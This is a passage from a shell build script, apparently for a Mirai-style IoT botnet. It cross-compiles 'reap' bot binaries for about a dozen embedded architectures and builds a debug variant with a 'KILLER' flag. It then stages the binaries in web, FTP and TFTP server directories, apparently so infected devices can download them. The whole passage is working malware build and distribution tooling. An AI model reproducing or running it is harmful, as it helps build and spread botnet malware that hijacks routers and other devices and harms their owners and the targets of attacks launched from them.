...
echo "Compiling: i586"
compile_bot i586 reap.x86 "$flags"
echo "Compiling: mips"
compile_bot mips reap.mips "$flags"
echo "Compiling: mipsel"
compile_bot mipsel reap.mpsl "$flags"
echo "Compiling: armv4l"
compile_bot armv4l reap.arm "$flags"
echo "Compiling: armv5l"
compile_bot armv5l reap.arm5 "$flags"
echo "Compiling: armv6l"
compile_bot armv6l reap.arm6 "$flags"
echo "Compiling: armv7l"
compile_bot armv7l reap.arm7 "$flags"
echo "Compiling: powerpc"
compile_bot powerpc reap.ppc "$flags"
echo "Compiling: sparc"
compile_bot sparc reap.spc "$flags"
echo "Compiling: m68k"
compile_bot m68k reap.m68k "$flags"
echo "Compiling: sh4"
compile_bot sh4 reap.sh4 "$flags"
echo "Compiling: bot.dbg"
gcc -g bot/*.c -obot.dbg -w "-DDEBUG -DKILLER"


cp release/reap.* /var/www/html/reaper
cp release/reap.* /var/ftp
mv release/reap.* /var/lib/tftpboot
rm -rf release
